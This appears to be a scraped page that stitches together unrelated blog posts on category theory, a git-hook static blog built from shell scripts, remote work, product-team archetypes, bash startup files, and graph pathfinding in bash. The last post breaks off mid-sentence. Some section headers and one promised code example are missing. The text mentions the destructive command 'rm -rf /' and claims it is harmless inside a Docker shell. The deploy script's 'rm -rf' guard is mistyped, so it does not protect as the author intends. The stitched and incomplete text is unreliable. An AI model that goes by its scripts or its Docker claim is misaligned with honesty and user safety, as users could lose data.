<p>Indeed, one of the main maxims of category theory is that <em>a mathematical object is completely determined by its relationships to all other objects</em>. To put it another way, two objects are essentially indistinguishable if and only if they relate to every object in the category in the same way. This theme (which is a consequence of a famous result called the Yoneda lemma) isn’t too different from what we observe in life. You can learn a lot about people by looking at their relationships—their Facebook friends, who they follow on Twitter, who they hang out with on Friday nights, for instance. And if you ever meet two people who have the <em>exact same</em> set of friends, and whose interactions on social media are <em>exactly the same</em>, and who hang out with the <em>exact same</em> people on Friday nights, then you might jokingly say, “You can’t even tell them apart”. Category theory informs us that, all jokes aside, this is actually true mathematically!</p>

So you might wonder “Hmm, if mathematical relationships are <em>that</em>&nbsp;important, then what about relationships between categories? Do <em>they</em>&nbsp;exist?” Great question. The answer is: absolutely! In fact, these particular relationships have a name—they are called <em>functors</em>. But why stop there? What about the relationships between those relationships? They, too, have a name: <em>natural transformations.</em></p>
<p>In fact, we can keep on going: “What about the relationships between the relationships between the relationships between the…?” Doing so will land us in higher-dimensional category theory, which is where much of Cheng’s research lies.</p>
<p>As abstract as this may sound, these constructions—categories, functors, and natural transformations—comprise a treasure trove of theory that shows up almost everywhere, in mathematics <em>and</em> in other disciplines! Since its inception, category theory has found natural applications in computer science, quantum physics, systems biology, chemistry, dynamical systems, and natural language processing, just to name a few. (The <a href="http://appliedcategorytheory.org/workshops">website</a> `Applied category theory’ contains a list of applications.) So even though category theory might sound a little abstract, it is highly applicable. And that’s no surprise. Category theory is all about relationships, and so is the world around us!</p>
<h2>Conclusion</h2>
<p>Categories are a little bit like anchovies: some folks love ’em, while for other folks they’re an acquired taste. So yes, it’s true that category theory may not help you find a delta for your epsilon, or determine if your group of order 520 is simple, or construct a solution to your PDE. For those endeavours, we do have to put our feet back on the ground. But thinking categorically can help serve as a beacon—it can strengthen your intuition and sharpen your insight—as you trek through the nooks and crannies of your favourite mathematical realms. And these days it’s especially hard to escape the pervasiveness of category theory throughout modern mathematics. So whatever your mathematical goals may be, learning a bit about categories will be well worth your time!</p>

<p>(alternate title: Rationalizing writing pointless shell scripts)</p>
<p>You should create your own blog and start writing. At lest that's what people who write blogs say. Apparently there is something good about creating things of something. So let's give it a try.</p>
<p>However in order to start a blog one must first have a some kind of a blogging platform. The sane way to do this would be to use your search engine of choice and research the available solutions in order to find one that sounds the most appealing.</p>
<p>Unfortunately before I could do that I had two very bad thoughts that stuck in my mind:</p>
<ol>
<li><em>If it's about the joy of creation, why not also create the blogging platform?</em></li>
<li><em>Wait, wouldn't it be cool if my publishing command was <code>git push</code> and then Git hooks took care of the rest?</em></li>
</ol>
<p>The result, surprisingly, is somewhat usable.</p>
<h2 id="requirements">Requirements</h2>
<p>As a good little software engineer I began by listing some requirements upfront before I even started to write code:</p>
<ol>
<li>Ability to work offline.</li>
<li>Publishing via <code>git push</code> + some server hooks.</li>
<li>Being able to deploy locally for previews.</li>
<li>Generating static pages.</li>
<li>Being able to write in Markdown or directly in HTML.</li>
<li>Generating an Atom/RSS feed automatically.</li>
</ol>
<p>Doesn't sound too bad, right? So let's see what came out of it.</p>
<h2 id="the-result">The Result</h2>
<p>In the end I got the whole thing running with three short(-ish) scripts, lets look at the first one:</p>
<p><strong>deploy.sh:</strong></p>
<pre><code>#!/bin/sh

BASE=$(pwd)
TARGET=${TARGET:-~/target}
HEADER=$BASE/header.html
FOOTER=$BASE/footer.html

rm -rf "{$TARGET:?}"/*
find * -type d ! -path '\.\/\.*' -print | xargs -I DIR  sh -c "mkdir -p $TARGET/DIR; HEADER=$HEADER FOOTER=$FOOTER ./indexer.sh DIR $TARGET/DIR"

find . -type f -name '*md' -print | sed 's/md$//' | xargs -I NAME  sh -c " { cat $HEADER; pandoc $BASE/NAMEmd; cat $FOOTER; } &gt; $TARGET/NAMEhtml; echo $TARGET/NAMEhtml"

find . -type f ! -path '\.\/\.*' ! -name '*md' -print | grep -v -E "footer.html|header.html|index-header.html|$0|indexer.sh|feed-header.xml" | xargs -I NAME cp "$BASE/NAME" "$TARGET/NAME"</code></pre>
<p>Initially I imagined it would look a bit prettier but oh well. Essentially it's an uglier way to say:</p>
<ol start="0">
<li>Remove whatever was last deployed. (Pray that it would not <code>rm -rf /</code>)</li>
<li>Index every directory.</li>
<li>Parse every Markdown into HTML and insert it between the header and footer.</li>
<li>Copy any other arbitrary files which are not used in the previous steps.</li>
</ol>
<p>Lovingly step number 3 uses a hard-coded list. I'm sure that won't bite me in the future.</p>
<p>However there is one fun thing about indexing. If we remove the first <code>find</code> line from most "important" features of a blog will still function - you would still be able to write and publish. The indexing is "only" for generating the update feed and creating a little landing page where visitors of the blog could see all articles in a list, sorted with the most recent first - that detail is important. So let's talk about indexing now.</p>
<h2 id="indexing---the-8020-rule">Indexing - the 80/20 rule</h2>
<p>The <code>./indexer.sh</code> script mention in the last code block looks like this:</p>
<pre><code>#!/bin/sh

HOME="https://rilia.xyz/"
HTML_OUT=$2/index.html
ATOM_OUT=$2/feed.atom

feed_entry() {
  echo "
    &lt;entry&gt;
      &lt;title&gt;$3&lt;/title&gt;
      &lt;link href=\"${HOME}${1}.html\"/&gt;
      &lt;id&gt;${HOME}${1}.html&lt;/id&gt;
      &lt;updated&gt;$2&lt;/updated&gt;
      &lt;content type=\"xhtml\"&gt;
$(pandoc $4)
      &lt;/content&gt;
    &lt;/entry&gt;"
}

html_entry() {
  echo "&lt;p&gt;&lt;a href=\"/$1.html\"&gt;$3&lt;/a&gt;&lt;i&gt; - $(echo $2 | sed 's/\ .*$//')&lt;/i&gt;&lt;/p&gt;&lt;br /&gt;"
}

cat "$HEADER" "$1"/index-header.html &gt; "$HTML_OUT"
echo '&lt;div class=feed&gt; &lt;a href=feed.atom&gt;Atom Feed&lt;/a&gt;&lt;/div&gt;' &gt;&gt; "$HTML_OUT"

cat "$1"/feed-header.xml &gt; "$ATOM_OUT"
date --rfc-3339=seconds &gt;&gt; "$ATOM_OUT"
echo '&lt;/updated&gt;' &gt;&gt; "$ATOM_OUT"

for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair
do
  date=$(echo $pair | sed 's/\ .*$//')
  f=$(echo $pair | sed 's/^.*\ //')
  timestamp=$(date --date=@"$date" --rfc-3339=seconds)
  title=$(grep -m 1 -e '^#\ ' "$f" | sed 's/^#\ \ *//')
  location=$(echo "$f" | sed 's/\.md$//' | sed 's/^\.\///')

  feed_entry "$location" "$timestamp" "$title" "$f" &gt;&gt; "$ATOM_OUT"
  html_entry "$location" "$timestamp" "$title" &gt;&gt; "$HTML_OUT"
done

cat "$FOOTER" &gt;&gt; "$HTML_OUT"
echo '&lt;/feed&gt;' &gt;&gt; "$ATOM_OUT"

echo "$HTML_OUT"
echo "$ATOM_OUT"
</code></pre>
<p>Whelp... Can't really sugar coat that one, it's ugly. Fun side note, you might have heard bout the <a href="https://en.wikipedia.org/wiki/Pareto_principle">80/20 rule</a>. One way to interpret it is that around 80% of the effort contributes to 20% of the final result. It doesn't really say that but bear with me: the two scripts are in total roughly 63 lines of code, from which <code>indexer.sh</code> is 51. That means that the indexing code is roughly 81% of the code base and probably of the total effort as well. Why was indexing difficult? Well it turns out that under Linux you cannot easily see the creating date of a file. You can do it under *BSD or Windows but the Linux kernel does not export some property of ext4 or something<a href="#fn1" id="fnref1"><sup>1</sup></a>. I <em>could</em> migrate the server to *BSD or try to get a better version of the <code>stat</code> core utility. Luckily since I was already using git repo to hold the blog files I had a workaround<a href="#fn2" id="fnref2"><sup>2</sup></a>, let's take a closer look at the following lines:</p>
<pre><code>for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair</code></pre>
<p>From the <code>git-log</code> manual it says that <code>%at</code> will display the "author date, UNIX timestamp". Therefore we can sort files based by querying when each one was added to the git repository. Probably very inefficient but it gets the job done and it works without any side effects. An alternative might be to use hooks that fire off on commits and appends the filename of the new files to a list. It would probably provide a good optimization for the total time it takes to update everything. The thing that worries me about that is that you would need to keep the list synchronised locally and with the server and also to try not to lose it. Perhaps the file could be part of the git repo? Possible optimizations for the future. At my current scale (one blog post) it doesn't really matter.</p>
<h2 id="the-git-hook">The Git Hook</h2>
<p>That one turned out easier than I expected, not much to say about it:</p>
<p><strong>post-update:</strong></p>
<pre><code>#!/bin/sh

unset GIT_INDEX_FILE

rm -rf /tmp/deploy
mkdir -p /tmp/deploy
GIT_DIR='/var/git/rilia.git'
git --work-tree=/tmp/deploy checkout -f
(cd /tmp/deploy; TARGET='/var/www/rilia' ./deploy.sh)</code></pre>
<h2 id="benefits-of-doing-it-this-way">Benefits of doing it this way</h2>
<p>I'm not sure but there might be some merit to using Git for a blogging platform:</p>
<ul>
<li>Relatively few dependencies</li>
</ul>
<p>Of course ignoring the big one - git, but I already wanted to have a private git server anyway so it was easily justifiable. Also for Markdown I use <code>pandoc</code>, but you could try some simpler tool or even a different templating language, <code>htlatex</code> is a thing.</p>
<ul>
<li>No active server</li>
</ul>
<p>At some point I checked <a href="https://gohugo.io/">hugo</a> since I overheard it was a good choice for making static sites. However configuration files scare me as well as having another server process active all the time. The git repo solution runs only on updates.</p>
<p>There is also <a href="https://mkws.sh/">mkws</a> which looks like a cool project, but I learned about it after being mostly done with the scripts.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I dunno, make stuff or something. Generating HTML is not <em>that</em> difficult so if the idea of making your own platform sounds appealing just go for it. Writing the scripts was somewhat fun even if I'm not a big fan of the POSIX shell syntax. In the end you might find a novel way to do a relatively simple thing and on its own that could be fun.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<p>I kinda hate myself for writing this post like a revelation in the times of pandemic and talking about remote work while it is <em>hot topic</em> . In reality, I have been working 100% remotely for more than 2 years (I previously worked for more than 8 years in the offices) and right now I feel I can tell my experiences about remote work and why I will probably never go back to a regular office job.</p>
<p>Around 2 years ago I got the offer to join MailerLite as a remote contractor. I was over-thinking whether I should start working remotely, what would it mean for me, my habits, social life, and my career progress. There were too many unknowns at that point as I have only done some freelance gigs remotely, but have been involved with distributed teams all over the world in previous companies. I took the red pill and my remote journey began.</p>
<p>All my doubts were cleared right away.</p>
<p>The first one - traffic. I hate the traffic in Belgrade. The city isn’t building its infrastructure (roads, bridges) as fast as it is growing and it is showing. On a good day, it took around 30 minutes of driving to work, which is not a problem. But, in the majority of days going to work and back home took on average 2 hours. I say 2 hours because you have to take into account that you have to find a parking space, probably 10 minutes from the office, and then walk to the office which all adds to 2 hours of lost time each day. If you calculate - it means that you are losing <strong>22 days per year</strong> in the traffic.</p>
<p>What could you do with that extra <em>time</em> that you have? I remember one analogy when I talked to one of my friends as he said: “It is like when people are telling that smokers could put all money they spend on cigarettes aside and can buy a new car after some time of saving. Then you see people who stopped smoking and after some time you don’t see them with a new car”. That wasn’t the case for me. I rediscovered hobbies that I have stopped practicing because of lack of time - started playing guitar more, recording new music, and most importantly, I had time to read more non-business related books. You can become dull and get into a work-home-sleep routine because of the lack of time.</p>
<p>Micromanagement was the other thing that I thought could happen in remote work. Fortunately, it didn’t. It is just a matter if you trust your employees or not. If you don’t trust your employees, you either didn’t hire the right people for your company or you are suffering from trust issues and adapting to the situation. Usually, it is the second thing. People who slack off because there aren’t any measures of control because they are working remotely show their faces and bad habits really fast and you can easily filter them.</p>
<p>When working remotely, <strong>you are your own manager</strong>. You must plan your time and goals, and how much you give yourself to work. Not too little and not too much, balance, as always, is the key.</p>
<p>There are so many tools to make communication while working remotely easy. We utilize Slack, have regular calls on Zoom, write our monthly feedback on 15five, and much more. If we need to brainstorm, we get on a video call or write in Slack.</p>
<p>There is one potential downside of working remotely for one target group - junior engineers. I will explain why I don’t think it is a rule but purely depends on the person. While junior engineers can always sit next to their mentors in a regular office job, here it is a bit different. Your company has to have really good documentation and processes so they don’t get lost. But, on the other hand, at MailerLite we are always looking for persons that are “self-starters” and can pick-up things themselves without or with minimal interference from other colleagues. In my experience, juniors can struggle at the beginning for the first (half of) year, but after that, they are usually stronger with knowledge and work ethics than juniors in regular offices. They are more independent in work and can easily learn new things and implement them.</p>
<p>The key thing in remote work is overcommunication. I can’t stress enough how much it is important. As a pitfall of remote work, you must write and overshare because there is no such thing as over-communication. Why do we do that? We are a remote-first company, but we have an office in Vilnius if someone wants to work from it. A couple of people are working from the office, but as I have been there a couple of times it is the most silent office I have ever been in. The communication is done via Slack or conference calls with everyone, so no one is left out, as this can be a problem when you have a combination of office and remote work in your company.</p>
<p>Productivity, personally, is sky-rocketing once I switched to the remote. I get at least 50% more stuff done as there are no distractions, unnecessary small-talks, listening to office gossips, braggings, and other things that can happen in the office.</p>
<p>Freedom is also an important thing. Sometimes I have to do something personal in the morning, or the middle of the day. Sometimes, I can go to the gym during the day and go back refreshed and start working. I can go to my hometown when I want to and work from there. I can travel wherever I want and work from there. I have become more social as I have more time for my friends and family and am less stressed. No one is looking at how much time you are spending working - but if you did the task or not which is the only important thing.</p>
<p>The biggest indicator that remote work is a benefit for both an employee and the company is that Microsoft and Google are now permanently remote if you want to. Pandemic nudged them in that direction, but they have seen the benefits and adapted.</p>
<p>Times are changing. Gosh, what a cliche sentence. <strong>Times are always changing, it is up to us if we want to adapt</strong>. Remote work has been around for a long time, but most of the companies resisted the change. I’m happy that companies are now forced to change because it requires a change of mindset, but there is a quote from my favourite TV series of all time, Twin Peaks, <em>“There’s some fear in letting go”</em>.</p>

<p>This is going to be a short walk in the product development zoo, I hope you’ll enjoy the ride!</p>
<p><em>Caveat</em>: what you’ll read about are (usually) not personality types but behaviors in a specific (type of) situation. Acting like a HIPPO, a WOLF, a RHINO or a ZEBRA doesn’t make anyone a bad person. You’re still a team, aim to understand where they are coming from, and, well, they might even be right, with the wrong communication style. </p>

<p>It can be tempting to give in to the HIPPOs – founders or CEO or VPS who want to make all the decisions – but don’t let them steer you off course.</p>
<p>Bring everything back to your vision and objectives. If the HIPPOs aren’t aligned with those, you could be headed for dangerous waters.</p>
<p>Don’t let your HiPPO kill your ideas – inform them with data and make them a <a href="https://www.forbes.com/sites/bernardmarr/2017/10/26/data-driven-decision-making-beware-of-the-hippo-effect/" target="_blank" rel="noopener">Data-driven HiPPO</a>! </p>

<h2>The WOLF – Working On the Latest Fire</h2>
<div>
<div>
<p>The WOLF has a short attention span and a temptation to jump from one problem to the next. They tend to only enjoy fighting fires, This will disrupt your team’s focus and effectiveness, making you easy prey for your competitors.</p>
<p>Create a process for collecting feedback about problems, bugs and only consider these along with all other requests. Set up triaging and set clear priorities and a method for prioritization.</p>
<p>There’s a whole book on WOLF prioritization: <a href="https://www.amazon.com/gp/product/1942788290/" target="_blank" rel="noopener">The Phoenix Project</a></p>

<p>The RHINO is just there to collect a paycheck without contributing much to the team. They might not be actively impeding your decision-making, but they are not helping much either. </p>
<p>Having a clearly defined prioritization process can help ensure all your team members understand how decisions are made and give them the confidence to actively participate. Hopefully, in this process, everyone is empowered to have a say and it doesn’t turn into “Well our process is that the boss tells you what’s important” – which is exactly how you end up with a team of disillusioned RHINOs.</p>

<h2>The ZEBRA – Zero Evidence But Really Arrogant</h2>
<div>
<div>
<p>ZEBRAs think they know it all but rely on their instinct rather than any actual evidence. To stave off the ZEBRAs in your midst, make sure that you’ve got data to back up your decisions.</p>
<p>Come up with quick experiments you can run to test ideas and gather evidence. Push for a data-driven culture.</p>

<h2>And one extra…. the RHINO again! This time, Really High value New Opportunity</h2>
<p>Usually, it’s a salesperson with an amazing value customer deal for an unplanned feature insisting re-allocating resources to build what’s required to win the deal. The results, sadly, are an ignored strategy and roadmap and resources allocated to serve a single customer.</p>
<p>There are two ways here:</p>
<p>1, Chase the RHINO away: Compare the opportunity cost and value and argue against signing the deal if you have customer insight supporting the roadmap.<br>2, Tame the RHINO: Adjust the roadmap if the opportunity includes features you already had planned for later in the year.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I remotely login to some Linux computers or use Docker containers, I would find the shell is plain black and white, different from the colorful shell I am used to dealing with on my local machine. This sometimes makes it difficult to look for libraries, executables, and folders. Sometimes, some executables could be called directly from a local shell but from a remote login shell they are not directly callable.</p>



<p>It turns out that the shell is an executable and it is “configured” by special shell scripts such as <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bash_profile</code>. In this blog post, I would like to briefly discuss the differences between these scripts.</p>

<h3 id="bashrc">~/.bashrc</h3>

<p>I modify the <code>~/.bashrc</code> file from time to time, because sometimes I would like to set some environment variables, including <code>PATH</code> which is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search when looking for executable files. But I have been ignoring the commented block at its beginning for decades.</p>

<div><div><pre><code>$ cat ~/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
</code></pre></div></div>

<p>This means that in a local shell where <code>bash</code> is being used, this shell script will be executed immediately after <code>bash</code> is executed. There are many other shell executable variants, such as <code>zsh</code>. <code>~/.bashrc</code> is only specific to <code>bash</code>.</p>



<p>There are many settings in the <code>~/.bashrc</code> that makes the shell look colorful. For example,</p>

<div><div><pre><code># enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
</code></pre></div></div>

<h3 id="profile">~/.profile</h3>

<p>The comment block found in the <code>~/.profile</code> explicitly tells us that it will be executed for the login shells. However, if <code>~/.bash_profile</code> or <code>~/.bash_login</code> exists, <code>~/.profile</code> will not be executed.</p>

<div><div><pre><code>$ cat ~/.profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
</code></pre></div></div>

<p>The default content of the <code>~/.profile</code> is simple. In most cases, it inherits whatever is in the <code>~/.bashrc</code>, and adds some user specific executable filepath to the environment variable <code>PATH</code>. So if there are commands that make the shell look colorful in the <code>~/.bashrc</code>, the login shell should also look colorful.</p>

<h3 id="bash_profile">~/.bash_profile</h3>

<p>Unfortunately, in most of my login trials, the shells were never colorful, and sometimes the environment variables did not match my expectation. In those cases, this is because there exists a <code>~/.bash_profile</code> and therefore <code>~/.profile</code> or <code>~/.bashrc</code> is never executed. Usually the <code>~/.bash_profile</code> will be empty, which means that we would not have the environment and appearance that we have in our local shell.</p>



<p>To make the login shell “back to normal”, we could either delete the <code>~/.bash_profile</code> or modify the <code>~/.bash_profile</code> by adding some commands like</p>



<h3 id="caveats">Caveats</h3>

<p>Sometimes, a non-color shell could be helpful. It can be used to indicate that you are not working in local shell, and that what you are seeing could either be a Docker shell or a remote login shell. When we know what shell we are dealing with, we will be more likely to avoid dangerous operations. For example, in a Docker shell, we could do almost anything, such as <code>rm -rf /</code> without sudo, without harming the local system.</p>

        <p>Many interesting problems in computer science are expressible as problems on
graphs: Finding the shortest path between two vertices, calculating a spanning
tree, finding a large independent set, etc. Often in Theoretical Computer
Science we only look for a theoretical solution - once we know how to model a
specific problem as graph we give an algorithm in pseudocode and leave it at
that. We will try an unconventional method practically solving these problems
using bash.</p>

<p>At ETH, Computer Science Master students learn how to efficiently (and
practically) solve graph problems in the Algorithms Lab, using
<a href="https://en.wikipedia.org/wiki/C%2B%2B">C++</a> and
<a href="https://www.boost.org/doc/libs/1_66_0/libs/graph/doc/index.html">BGL</a><sup id="fnref:6"><a href="#fn:6">1</a></sup>. In
this course it is not enough to come up with a theoretical algorithm. One also
have to implement and pass testcases as part of his solution. The BGL offers
many sophisticated graph algorithms, each one cleverly optimized in order to
make the generated code as fast as possible. It does its job well: It makes it
(relatively) easy to use sophisticated graph theoretic algorithms in practice.
But it is hugo and complicated. Is there maybe an easier way to solve graph
problems on a computer, without having to implement most of the boring
algorithms and without installing a bazillion dependencies?</p>

<p>It turns out that we can (ab)use just about any Linux system for this, and we do
not even need a C++ compiler, or any other compiler for that matter. All we need
is any run-of-the-mill shell (bash will do just fine), and some standard system
utilities such as <code>find(1)</code>, <code>tr(1)</code>, <code>paste(1)</code>, <code>cut(1)</code>, etc.<sup id="fnref:1"><a href="#fn:1">2</a></sup>, which (for
GNU/Linux systems) are packaged in the so-called <a href="https://www.gnu.org/software/coreutils/">GNU
<code>coreutils</code></a>. Most other systems
provide similar, if not the same, commands - they may be packaged differently
however.</p>

<h3 id="pathfinding-in-trees">Pathfinding in trees</h3>

<p>We will start with a simple problem: Given an undirected, acyclic and connected
graph, commonly known as <em>tree</em>, find the unique path between two vertices i and
j of said tree.</p>

<p>The first problem we have to solve is <em>representing</em> our graph. Recall from that
there are may possible ways to represent graphs: Adjacency lists, (for each
vertex list all its neighbors), Adjacency matrices (entry (i, j) is 1 iff edge
(i, j) exists), and many more. The most obvious solution would be to put all of
that information in a text file and then operate on that, but then we would be
no further than C++, since we would still have to implement most of the
algorithms by hand. So let us go up a step in the hierarchy: If files are bad,
can we maybe use directories instead?</p>

<p>It turns out that this works nicely, but only when our graph is a <em>rooted
tree</em>. In a rooted tree we choose an arbitrary vertex as root and then list all
vertices ordered by their distance from the root: First comes the root itself,
then the root’s neighbors, then the root’s neighbors’ neighbors, etc. Let
us have a look at an example, a tree rooted at vertex 0:</p>

<figure>
    <img src="https://blog.3fx.ch/post/images/rooted-tree.svg" width="300px"> 
</figure>


<p>We can easily translate this tree into a directory structure:</p>

<pre><code>mkdir -p 0/1/3/{4,5}
mkdir -p 0/2/6
</code></pre>

<p>How do we display our tree? The best utility I know for this task is aptly named
<code>tree(1)</code>. Sadly, it is not part of the GNU coreutils and you most likely have
to install it with your favorite package manager. Running <code>tree</code> then shows us
the tree we constructed:</p>

<pre><code>% tree
.
└── 0
    ├── 1
    │&nbsp;&nbsp; └── 3
    │&nbsp;&nbsp;     ├── 4
    │&nbsp;&nbsp;     └── 5
    └── 2
        └── 6
</code></pre>

<p>Now we can answer questions such as “How can I get from 0 to i?”, where i is an
arbitrary vertex other<sup id="fnref:4"><a href="#fn:4">3</a></sup> of our tree using the <code>find(1)</code> command. The <code>find</code>
command traverses all files in a given directory, and can optionally search for
specific criteria, for example directory names. If we wanted to know how to get
from vertex 0 to vertex 3 we can run the following command:</p>

<pre><code>% find 0 -name 3
0/1/3
</code></pre>

<p>which tells us that we can go from 0 to 3 via vertex 1. In fact, we can
generalize this to arbitrary vertices i and j: First we check how to get from 0
to i, and then from 0 to j, and finally we have to find the common ancestor of
both paths. Then we reverse the path from 0 to i (now it is a path from i to 0),
walk along it until we hit the common ancestor of i and j, and then walk down
the path from the common ancestor to j.</p>

<p>The most difficult part of this procedure is finding the common ancestor. Lucky
for us the package <code>diffutils</code> provides the <code>cmp(1)</code> command, which can tell us
the first byte at which two files differ. The output of cmp is a bit verbose,
but using <code>cut(1)</code> and <code>tr(1)</code> from the coreutils we can extract the
relevant information:</p>

<div><pre><code data-lang="bash">% cmp &lt;<span>(</span><span>echo</span> <span>"testa"</span><span>)</span> &lt;<span>(</span><span>echo</span> <span>"testb"</span><span>)</span>
/proc/self/fd/11 /proc/self/fd/12 differ: byte <span>5</span>, line <span>1</span>
% cmp &lt;<span>(</span><span>echo</span> <span>"testa"</span><span>)</span> &lt;<span>(</span><span>echo</span> <span>"testb"</span><span>)</span> <span>|</span> cut -d <span>" "</span> -f <span>5</span> <span>|</span> tr -cd <span>"[:digit:]"</span>
<span>5</span></code></pre></div>

<p>How does this work? The program <code>cut</code> takes a delimiter (<code>-d</code>) and some position
number (<code>-f</code>) and returns the string at the given position (1-indexed) when
splitting on the delimiter specified by <code>-d</code>. We use <code>tr</code> to delete (<code>-d</code>) all
non-digits (<code>-c</code> stands for the complement of the character set) to ensure that
we get <code>5</code> as result, and not <code>5,</code>. So far so good, let us look where we are
now:</p>

<div><pre><code data-lang="bash"><span># In Bash arguments are passed implicitly and referenced</span>
<span># using $1, $2, etc. We use $1 as i and $2 as j</span>
path_between<span>()</span> <span>{</span>
    <span>path_to_i</span><span>=</span><span>$(</span>find -name <span>$1</span><span>)</span>
    <span>path_to_j</span><span>=</span><span>$(</span>find -name <span>$2</span><span>)</span>

    <span>first_diff_byte</span><span>=</span><span>$(</span>cmp &lt;<span>(</span><span>echo</span> <span>$path_to_i</span><span>)</span> &lt;<span>(</span><span>echo</span> <span>$path_to_j</span><span>)</span> <span>\
</span><span></span>            <span>|</span> cut -d <span>" "</span> -f <span>5</span> <span>\
</span><span></span>            <span>|</span> tr -c -d <span>'[:digit:]'</span><span>)</span></code></pre></div>

<p>It remains to find the common ancestor of i and j. Since we know where the paths
differ, we know up to which character they are identical. Using <a href="https://www.tldp.org/LDP/abs/html/parameter-substitution.html">bash variable
expansion</a> we can
identify the common prefix, and using <code>cut</code> extract the vertex they have in
common. The <code>rev</code> command from the <code>util-linux</code> package reverses a string of
characters:</p>

<div><pre><code data-lang="bash">    <span>common_prefix</span><span>=</span><span>${</span><span>path_to_i</span><span>:</span><span>0</span><span>:(( </span><span>$first_diff_byte</span><span> - 1 ))</span><span>}</span>
    <span>common_ancestor</span><span>=</span><span>$(</span><span>echo</span> -n <span>$common_prefix</span> <span>|</span> rev <span>|</span> cut -d / -f <span>2</span> <span>|</span> rev<span>)</span></code></pre></div>

<p>The part in the double parenthesis is subject to the <code>expr(1)</code> command<sup id="fnref:2"><a href="#fn:2">4</a></sup>, which
and evaluates the expression as arithmetic expression. Now all we have left to
do is to stick all of it together:</p>

<div><pre><code data-lang="bash">    <span># if we omit local here we set $PATH...</span>
    <span>local</span> <span>path</span><span>=</span><span>$(</span><span>echo</span> <span>${</span><span>path_to_i</span><span>#</span><span>"</span><span>$common_prefix</span><span>"</span><span>}</span> <span>\
</span><span></span>        <span>|</span> tr <span>'/'</span> <span>$'\n'</span> <span>\
</span><span></span>        <span>|</span> tac <span>\
</span><span></span>        <span>|</span> paste -s -d <span>'/'</span><span>)</span>
    <span>path</span><span>=</span><span>$path</span>/<span>$common_ancestor</span>/<span>${</span><span>path_to_j</span><span>#</span><span>"</span><span>$common_prefix</span><span>"</span><span>}</span>

    <span>echo</span> <span>$path</span>
<span>}</span></code></pre></div>

<p>Using the <code>tr</code>, <code>tac</code> and <code>paste</code> commands (all part of coreutils) we can
reverse the path from i to the common ancestor of i and j. We do this by
changing the slashes which delimit our vertices to newlines and using
<code>tac</code><sup id="fnref:3"><a href="#fn:3">5</a></sup> to reverse the order of our vertices. Finally
we can use <code>paste</code> to put the reversed vertices back together in a single string
and then append the path from the common ancestor to j.</p>

<p>Testing it on our input graph gives the following output:</p>

<pre><code>% path_between 4 5
4/3/5
% path_between 5 4
5/3/4
% path_between 0 5
/.//1/3/5
% path_between 3 4
/1//4
</code></pre>

<p>It seems like it fails when the common ancestor is either i or j. We can remedy
thisby handling these cases separately: If i is the common ancestor, we can
simply take the path from i to j minus the path from 0 to the ancestor of i.
Else if j is the common ancestor then we have to first reverse the path from j
to i (so we get the path from i to j) and the remove the path to j’s ancestor.</p>

<div><pre><code data-lang="bash"><span>if</span> <span>[[</span> <span>$common_prefix</span> <span>==</span> <span>$path_to_i</span> <span>]]</span><span>;</span> <span>then</span>
    <span>local</span> <span>path</span><span>=</span><span>$1</span><span>${</span><span>path_to_j</span><span>#</span><span>"</span><span>$common_prefix</span><span>"</span><span>}</span>
<span>elif</span> <span>[[</span> <span>$common_prefix</span> <span>==</span> <span>$path_to_j</span> <span>]]</span><span>;</span> <span>then</span>
    <span>local</span> <span>path</span><span>=</span><span>$(</span><span>echo</span> <span>${</span><span>path_to_i</span><span>#</span><span>"</span><span>$common_prefix</span><span>"</span><span>}</span> <span>\
</span><span></span>        <span>|</span> tr <span>'/'</span> <span>$'\n'</span> <span>\
</span><span></span>        <span>|</span> tac <span>\
</span><span></span>        <span>|</span> paste -s -d /<span>)</span>
    <span>path</span><span>=</span><span>$path$2</span>
<span>else</span>
    <span># Do what we did before</span>
<span>fi</span></code></pre></div>

<p>Now it gives correct results for any query:</p>

<pre><code>% path_between 3 4
3/4
% path_between 4 3
4/3
% path_between 6 4
6/2/0/1/3/4
% path_between 0 1
0/1
% path_between 1 0
1/0
</code></pre>

<p>That’s it. In 20 lines of bash we wrote a pathfinding algorithm for trees. Not
only that, but we did it without needing to compile any code, only using tools
available on most Linux systems! I find that quite impressive.</p>

<h3 id="pathfinding-in-general-graphs">Pathfinding in general graphs</h3>

<p>Restricting ourselves to rooted trees sounds pretty limiting doesn’t it? Can we
generalize our model to arbitrary graphs? At first it seems like we cannot,
since then our file system (which is where we store our graph) does not support
cycles. After all, no directory can be a (grand-)parent of itself. But it turns
out that using <a href="https://en.wikipedia.org/wiki/Symbolic_link">symbolic links</a> we
can “point” to other directories, which can in turn point to other directories,
which can point to other directories, etc. We can create symlinks using the <code>ln</code>
command (incidentally also found in coreutils), by writing <code>ln -s &lt;directory
point to&gt; &lt;name of the link&gt;</code>. For each vertex we want to create a directory and
in that directory create symbolic links to all of its neighbors.  If you recall
the different forms of graph representation before this corresponds to adjacency
